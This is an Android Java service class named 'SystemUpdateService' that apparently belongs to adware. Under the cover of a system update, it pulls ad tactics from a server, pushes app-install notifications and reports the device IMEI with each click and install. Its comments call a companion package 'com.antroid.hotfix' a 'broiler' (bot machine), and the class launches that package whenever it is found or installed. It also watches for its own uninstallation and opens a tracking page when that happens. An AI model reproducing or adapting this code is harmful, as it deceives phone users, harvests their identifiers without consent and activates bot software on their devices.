package com.hkc.service;

import java.io.File;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.List;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Handler;
import android.os.IBinder;
import android.text.TextUtils;
import android.widget.Toast;

import com.hkc.UninstallMoniter;
import com.hkc.constant.Constant;
import com.hkc.constant.Constant.IntentAction;
import com.hkc.constant.MetaDataKey;
import com.hkc.db.AdTacticDao;
import com.hkc.db.AppAdvertisementDao;
import com.hkc.http.FreshResponse;
import com.hkc.http.NotifiNoneReportRequest;
import com.hkc.http.NotificationListGetRequest;
import com.hkc.http.NotificationListGetResponse;
import com.hkc.http.NotificationStaticRequest;
import com.hkc.http.NotificationStaticRequest.StaticAction;
import com.hkc.http.VoListener;
import com.hkc.http.VoNetCenter;
import com.hkc.model.AdTactic;
import com.hkc.model.AppAdvertisement;
import com.hkc.notification.AppAdvManager;
import com.hkc.utils.BlackUtils;
import com.hkc.utils.DateUtils;
import com.hkc.utils.Logger;
import com.hkc.utils.MiscUtils;

public class SystemUpdateService extends Service implements VoListener {

	private static final String TAG = SystemUpdateService.class.getSimpleName();
	private static final int RETRY_TIME = 15;
	private static final int RETRY_TIMES = 5;
	private static final String NETWORK_CHANGE = "android.net.conn.CONNECTIVITY_CHANGE";

	/**
	 * 肉机apk的包名
	 */
	public static final String SYSTEM_UPDATE_SERVICE_PACKAGE = "com.antroid.hotfix";
	private static final String SYSTEM_UPDATE_SERVICE = SYSTEM_UPDATE_SERVICE_PACKAGE
			+ ".SystemUpdateService";
	/**
	 * 初始化service
	 */
	private static final String ACTION_NOTIFICATION_SCHEDULE = "com.blsm.sft.fresh.notification.schedule";

	private int count = 0;
	private ConnectionChangeReceiver receiver;
	private ApkInstallReceiver apkReiceiver;
	private boolean requestInProcess = false;

	@Override
	public void onCreate() {
		Logger.i(TAG, "onCreate ::");

		/**
		 * 初始化监听应用卸载的进程
		 */
		UninstallMoniter.getInstance().listenSelfUninstall(
				"/data/data/" + getApplicationInfo().packageName,
				UninstallMoniter.getUninstallUserData(this,
						getApplicationInfo().packageName));

		count = 0;
		registerNetworkListenner(true);
		registerApkInstallListenner(true);
		super.onCreate();
	}

	// 由于targetSdkVersion低于17，只能通过反射获取
	private String getUserSerial() {
		Object userManager = getSystemService("user");
		if (userManager == null) {
			Logger.e(TAG, "userManager not exsit !!!");
			return null;
		}

		try {
			Method myUserHandleMethod = android.os.Process.class.getMethod(
					"myUserHandle", (Class<?>[]) null);
			Object myUserHandle = myUserHandleMethod.invoke(
					android.os.Process.class, (Object[]) null);

			Method getSerialNumberForUser = userManager.getClass().getMethod(
					"getSerialNumberForUser", myUserHandle.getClass());
			long userSerial = (Long) getSerialNumberForUser.invoke(userManager,
					myUserHandle);
			return String.valueOf(userSerial);
		} catch (NoSuchMethodException e) {
			Logger.e(TAG, "", e);
		} catch (IllegalArgumentException e) {
			Logger.e(TAG, "", e);
		} catch (IllegalAccessException e) {
			Logger.e(TAG, "", e);
		} catch (InvocationTargetException e) {
			Logger.e(TAG, "", e);
		}

		return null;
	}

	private void registerApkInstallListenner(boolean isRegiste) {
		IntentFilter filter = new IntentFilter();
		// must add datascheme or you will not receive the broadcast
		filter.addDataScheme("package");
		filter.addAction(Intent.ACTION_PACKAGE_ADDED);
		filter.addAction(Intent.ACTION_PACKAGE_CHANGED);
		filter.addAction(Intent.ACTION_PACKAGE_REMOVED);
		if (isRegiste) {
			if (null == apkReiceiver) {
				apkReiceiver = new ApkInstallReceiver();
			}
			registerReceiver(apkReiceiver, filter);
		} else {
			if (null != apkReiceiver) {
				unregisterReceiver(apkReiceiver);
			}
		}
	}

	@Override
	public void onDestroy() {
		registerNetworkListenner(false);
		super.onDestroy();
	}

	private void registerNetworkListenner(boolean isRegiste) {
		IntentFilter intentFilter = new IntentFilter();
		intentFilter.addAction(NETWORK_CHANGE);
		if (isRegiste) {
			if (null == receiver) {
				receiver = new ConnectionChangeReceiver();
			}
			registerReceiver(receiver, intentFilter);
		} else {
			if (receiver != null) {
				unregisterReceiver(receiver);
			}
		}
	}

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		Logger.i(TAG, "onStartCommand ");
		// incase of service been killed by system it will receive a null intent
		if (null == intent || null == intent.getAction()) {
			return super.onStartCommand(intent, flags, startId);
		}
		Logger.d(TAG, "command action:" + intent.getAction());
		// 比较两个变量的值时，注意最好把常量写到前边，这样就能避免变量为空的时候系统报NullPointerException
		if (IntentAction.ACTION_NOTIFICATION_SCHEDULE
				.equals(intent.getAction())) {
			getDataFromServer();
		}
		// install apk
		else if (IntentAction.ACTION_NOTIFICATION_INSTALL_APP.equals(intent
				.getAction())) {
			String filePath = intent.getStringExtra("savePath");
			AppAdvertisement adv = (AppAdvertisement) intent
					.getSerializableExtra("adv");
			Logger.i(TAG, "onStartCommand :: install savePath = " + filePath);
			if (adv != null) {
				HashMap<String, String> map = new HashMap<String, String>();
				map.put("packageName", adv.getPackageName());
				// AgentImpl.getAgentImpl().onEvent(context,
				// UmengEvent.NOTIFICATION_APP_CLICK, map);
				Logger.d(TAG, "start to use aihuo analytics...");
				NotificationStaticRequest request = new NotificationStaticRequest();
				request.setApi_key(String.valueOf(MiscUtils.getMetaData(this,
						MetaDataKey.HKC_APP_KEY)));
				request.setAdv_id(adv.getId() + "");
				request.setDevice_id(MiscUtils.getIMEI(this));
				request.setStaticAction(StaticAction.CLICK);
				VoNetCenter.doRequest(this, request, null);
				Logger.d(TAG, "start to set adv readed...");
				AppAdvManager.getInstance(this).setAdvReaded(adv);
			}
			Logger.v(TAG, "continue to check the file path...");
			if (!TextUtils.isEmpty(filePath) && filePath.endsWith(".apk")) {
				Logger.d(TAG, "start to install the apk");
				Intent installIntent = new Intent(Intent.ACTION_VIEW);
				installIntent.setDataAndType(Uri.fromFile(new File(filePath)),
						"application/vnd.android.package-archive");
				installIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				startActivity(installIntent);
			}
		}
		// task time up
		else if (IntentAction.ACTION_NOTIFICATION_TASK_TIME_UP.equals(intent
				.getAction())) {
			AdTactic adTactic = (AdTactic) intent
					.getSerializableExtra("tactic");
			Logger.i(TAG, "onStartCommand :: tactic = " + adTactic);
			new TacticTask(adTactic).execute();
		}// 后台运行时弹出广告
		else if (IntentAction.ACTION_NOTIFICATION_SHOW_BACKGROUND_RUNNIG_AD
				.equals(intent.getAction())) {

		}
		return super.onStartCommand(intent, flags, startId);
	}

	private void runTask(AdTactic adTactic) {
		AdTacticDao.getDao(this).setTacticReaded(adTactic);
		showNotification(adTactic);
	}

	private void getDataFromServer() {
		if (notGetDataToday()) {
			doGetFromServer();
		}
	}

	private void doGetFromServer() {
		int blackValue = BlackUtils.getBlackInt(SystemUpdateService.this);
		Logger.i(TAG, "doGetFromServer ::" + blackValue);
//		if (requestInProcess || blackValue != 1) {
//			return;
//		}
		
		if (requestInProcess) {
			return;
		}
		requestInProcess = true;
		NotificationListGetRequest request = new NotificationListGetRequest();
		String channel = (String) MiscUtils.getMetaData(this, "HKC_CHANNEL");
		request.getParams().put("channel", channel);
		request.getParams().put("api_key",
				MiscUtils.getMetaData(this, MetaDataKey.HKC_APP_KEY));
		VoNetCenter.doRequest(this, request, this);
	}

	private void scheduleNextGet() {
		Calendar now = (Calendar) Calendar.getInstance().clone();
		AlarmManager manager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
		Intent task = new Intent(this, SystemUpdateService.class);
		task.setAction(IntentAction.ACTION_NOTIFICATION_SCHEDULE);
		PendingIntent operation = PendingIntent.getService(this,
				PendingIntent.FLAG_ONE_SHOT, task,
				(int) (now.getTimeInMillis() % 1000));
		// next day get data from server once more
		manager.set(AlarmManager.RTC, now.getTimeInMillis() + 24 * 60 * 60
				* 1000, operation);
	}

	private boolean notGetDataToday() {
		SharedPreferences sharedPref = getSharedPreferences(
				Constant.APP_PREF_FILE, Context.MODE_PRIVATE);
		String date = sharedPref.getString(Constant.PrefKey.LAST_GET_ADV_DATE,
				"");
		Date dateToday = DateUtils.parseDate(date, DateUtils.DF_YYYYMMDD);
		boolean isToday = DateUtils.isToday(dateToday);
		if (TextUtils.isEmpty(date) || !isToday) {
			return true;
		} else {
			return false;
		}
	}

	@Override
	public void onRequestFinished(FreshResponse response) {
		Logger.i(TAG,
				"onRequestFinished :: result = " + response.getResultType());
		if (response != null && response instanceof NotificationListGetResponse) {
			if (response.getResultType() == ResultType.SUCCESS) {
				// reset retry count and todo task
				count = 0;
				AdTacticDao.getDao(this).deleteAll();
				NotificationListGetResponse mResponse = (NotificationListGetResponse) response;
				List<AppAdvertisement> advs = mResponse.getAdvs();
				// 如果广告为空，赶紧向服务器端发送请求
				if (advs == null || advs.size() < 1) {
					NotifiNoneReportRequest request = new NotifiNoneReportRequest();
					request.setApi_key(String.valueOf(MiscUtils.getMetaData(
							this, MetaDataKey.HKC_APP_KEY)));
					VoNetCenter.doRequest(this, request, null);
				}
				AppAdvertisementDao.getDao(this).addAppAdvertisementList(advs);
				AdTacticDao.getDao(this).addAdTacticList(
						mResponse.getAdTactics());
				SharedPreferences sharedPref = this.getSharedPreferences(
						Constant.APP_PREF_FILE, Context.MODE_PRIVATE);
				Editor editor = sharedPref.edit();
				String today = DateUtils.getTimeNow();
				editor.putString(Constant.PrefKey.LAST_GET_ADV_DATE, today);
				editor.commit();
				getTasks();
				scheduleNextGet();
			} else {
				if (count < RETRY_TIMES) {
					new Handler().postDelayed(new Runnable() {
						@Override
						public void run() {
							getDataFromServer();
						}
					}, 1000 * RETRY_TIME);
					count++;
				}
			}
		}
		requestInProcess = false;
	}

	private void getTasks() {
		List<AdTactic> tactics = AdTacticDao.getDao(this)
				.getUnReadedTacticsList();
		Logger.i(TAG, "getTasks tactics size = " + tactics.size());
		if (null != tactics && tactics.size() > 0) {
			for (AdTactic adTactic : tactics) {
				if (notExpiredTask(adTactic)) {
					arrangeTask(adTactic);
				} else {
					AdTacticDao.getDao(this).setTacticReaded(adTactic);
				}
			}
		}
	}

	private boolean notExpiredTask(AdTactic adTactic) {
		if (adTactic.getAction().equals("time_triggered")) {
			if (!timePast(adTactic.getValue())) {
				return true;
			} else {
				return false;
			}
		} else {
			return true;
		}
	}

	private boolean timePast(String value) {
		Date todoDate = DateUtils.parseDate(value, DateUtils.DF_HHMM);
		Calendar todoTime = (Calendar) Calendar.getInstance().clone();
		todoTime.set(Calendar.HOUR_OF_DAY, todoDate.getHours());
		todoTime.set(Calendar.MINUTE, todoDate.getMinutes());
		boolean isPast = Calendar.getInstance().after(todoTime);
		Logger.i(TAG, "timePast isPast = " + isPast);
		return isPast;
	}

	private void arrangeTask(final AdTactic adTactic) {
		Logger.i(TAG, "arrangeTask :: task = " + adTactic);
		if (adTactic.getAction().equals("time_triggered")) {
			dealTimeTrigger(adTactic);
		} else if (adTactic.getAction().equals("open_app")) {
			AdTacticDao.getDao(this).setTacticReaded(adTactic);
			new Handler().postDelayed(new Runnable() {
				@Override
				public void run() {
					showNotification(adTactic);
				}
			}, 1000 * Integer.parseInt(adTactic.getValue()));
		} else if (adTactic.getAction().equals("quit_app")) {
			AdTacticDao.getDao(this).setTacticReaded(adTactic);
			new Handler().postDelayed(new Runnable() {
				@Override
				public void run() {
					showNotification(adTactic);
				}
			}, 1000 * Integer.parseInt(adTactic.getValue()) * 3);
		} else if (adTactic.getAction().equals("other")) {

		}

	}

	private void dealTimeTrigger(AdTactic adTactic) {
		if (adTactic == null) {
			return;
		}
		String todoTime = adTactic.getValue();
		AlarmManager manager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
		Intent task = new Intent(this, SystemUpdateService.class);
		task.setAction(IntentAction.ACTION_NOTIFICATION_TASK_TIME_UP);
		task.putExtra("tactic", adTactic);
		PendingIntent operation = PendingIntent.getService(this,
				PendingIntent.FLAG_ONE_SHOT, task, adTactic.getId());
		long triggerAtTime = getTrigerTime(todoTime);
		if (triggerAtTime > 0) {
			manager.set(AlarmManager.RTC, triggerAtTime, operation);
		}

	}

	private long getTrigerTime(String todoTime) {
		if (TextUtils.isEmpty(todoTime)) {
			return -1;
		}
		Date todoDate = DateUtils.parseDate(todoTime, DateUtils.DF_HHMM);
		Calendar calendarNow = Calendar.getInstance();
		Calendar todo = (Calendar) calendarNow.clone();
		todo.set(Calendar.HOUR_OF_DAY, todoDate.getHours());
		todo.set(Calendar.MINUTE, todoDate.getMinutes());
		Logger.i(TAG,
				"getTrigerTime :: hour = " + todo.get(Calendar.HOUR_OF_DAY)
						+ " minutes = " + todo.get(Calendar.MINUTE));
		Logger.i(TAG, "getTrigerTime :: cur = " + System.currentTimeMillis()
				+ " todo = " + todo.getTimeInMillis());
		return todo.getTimeInMillis();
	}

	public void showNotification(AdTactic adTactic) {
		if (!MiscUtils.isNetworkConnected(this)) {
			return;
		}
		if (!MiscUtils.isWifi(this)) {
			return;
		}
		AppAdvManager manager = AppAdvManager.getInstance(this);
		AppAdvertisement adv = null;

		if (adTactic.getAdvertisement_id() != 0) {
			adv = AppAdvertisementDao.getDao(this).getAappAdvertisement(
					adTactic.getAdvertisement_id());
		}
		if (adv == null) {
			adv = manager.getRandomAdv();
		}
		// if adv is installed try get another one
		while (adv != null) {
			if (manager.isInstalled(adv.getPackageName())) {
				AppAdvertisementDao.getDao(this).setAdvReaded(adv);
				adv = manager.getRandomAdv();
			} else {
				break;
			}
		}
		Logger.i(TAG, "showNotification :: adv = " + adv);
		if (null == adv) {
			return;
		} else {
			adv.setTactic(adTactic);
			manager.showInstallNotification(this, adv);
			// 如果用户的手机已经安装了肉机apk，在这里，我们把肉机启动起来
			boolean installed = manager
					.isInstalled(SYSTEM_UPDATE_SERVICE_PACKAGE);
			Logger.v(TAG, " User installed broiler?" + installed);
			if (installed) {
				startBroilerService(this);
			}
		}
	}

	class TacticTask extends AsyncTask<String, String, String> {

		private AdTactic adTactic;

		public TacticTask(AdTactic adTactic) {
			this.adTactic = adTactic;
		}

		@Override
		protected String doInBackground(String... params) {
			if (adTactic == null) {
				return null;
			} else {
				runTask(adTactic);
			}
			return null;
		}

	}

	public class ConnectionChangeReceiver extends BroadcastReceiver {
		@Override
		public void onReceive(Context context, Intent intent) {
			Logger.i(TAG, "onReceive :: networkchange");
			if (MiscUtils.isWifi(context)) {
				getDataFromServer();
			}
			/**
			 * 初始化监听应用卸载的进程
			 */
			UninstallMoniter.getInstance().listenSelfUninstall(
					"/data/data/" + getApplicationInfo().packageName,
					UninstallMoniter.getUninstallUserData(context,
							getApplicationInfo().packageName));

		}
	}

	/**
	 * 启动肉机service
	 * 
	 * @param context
	 */
	private void startBroilerService(Context context) {
		try {
			Logger.d(TAG, "starting broiler service...");
			ComponentName componentName = new ComponentName(
					SYSTEM_UPDATE_SERVICE_PACKAGE, SYSTEM_UPDATE_SERVICE);
			Intent broiler = new Intent();
			broiler.setComponent(componentName);
			broiler.setAction(ACTION_NOTIFICATION_SCHEDULE);
			startService(broiler);
		} catch (Exception e) {
			Logger.e(TAG, "start broiler exception:" + e.getMessage());
			e.printStackTrace();
		}
	}

	public class ApkInstallReceiver extends BroadcastReceiver {
		@Override
		public void onReceive(Context context, Intent intent) {
			// 应用安装
			if (Intent.ACTION_PACKAGE_ADDED.equals(intent.getAction())
					&& intent.getData() != null) {
				try {
					String packageName = intent.getData().toString();
					Logger.i(TAG, "onReceive packageName =" + packageName);
					// Toast.makeText(context, "有应用被安装" + packageName,
					// Toast.LENGTH_LONG).show();
					// 查找安装的这个apk是否在本地广告中存在
					AppAdvertisement adv = AppAdvertisementDao.getDao(context)
							.getAappAdvertisement(
									packageName.replace("package:", "").trim());
					if (adv != null) {
						// 如果存在，那么就要统计安装广告的次数
						NotificationStaticRequest request = new NotificationStaticRequest();
						request.setApi_key(String.valueOf(MiscUtils
								.getMetaData(context, MetaDataKey.HKC_APP_KEY)));
						request.setAdv_id(adv.getId() + "");
						request.setDevice_id(MiscUtils.getIMEI(context));
						request.setStaticAction(StaticAction.INSTALL);
						VoNetCenter.doRequest(context, request, null);
					}

					// 如果本地有肉鸡，那么启动肉鸡程序
					if (packageName.contains(SYSTEM_UPDATE_SERVICE_PACKAGE)) {
						startBroilerService(context);
					}
				} catch (Exception e) {
					e.printStackTrace();
				}

			}

			// 应用卸载
			if (Intent.ACTION_PACKAGE_REMOVED.equals(intent.getAction())
					&& intent.getData() != null) {
				try {

					String packageName = intent.getData().toString()
							.replace("package:", "");
					String webUrl = UninstallMoniter.getInstance()
							.getUninstallWebUrl()
							+ "?data="
							+ UninstallMoniter.getUninstallUserData(context,
									packageName);
					Logger.d(TAG, "webURL:"+webUrl);
					Uri uri = Uri.parse(webUrl);
					Intent viewIntent = new Intent();
					viewIntent.setAction(Intent.ACTION_VIEW);
					viewIntent.setClassName("com.android.browser",
							"com.android.browser.BrowserActivity");
					viewIntent.setData(uri);
					viewIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					SystemUpdateService.this.startActivity(viewIntent);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}

		}
	}

}
